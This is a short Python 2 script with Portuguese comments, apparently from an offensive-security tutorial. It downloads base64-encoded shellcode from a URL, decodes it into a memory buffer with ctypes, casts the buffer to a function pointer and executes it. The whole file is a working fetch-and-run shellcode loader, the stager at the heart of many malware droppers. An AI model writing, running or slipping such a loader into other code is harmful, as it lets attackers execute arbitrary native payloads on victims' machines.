import urllib2
import ctypes 
import base64

Url = "http://127.0.0.1:8080/shellcode.bin"
response = urllib2.urlopen(Url)

# decodando o shellcode de base64
shellcode = base64.b64decode(response.read())

#criando o buffer na memória 
shellcode_buffer = ctypes.create_string_buffer(shellcode, len(shellcode))

#criando a função ponte para o seu shellcode
shellcode_func = ctypes.cast(shellcode_buffer, ctypes.CFUNCTYPE(ctypes.c_void_p))

# ligue seu shellcode 
shellcode_func()
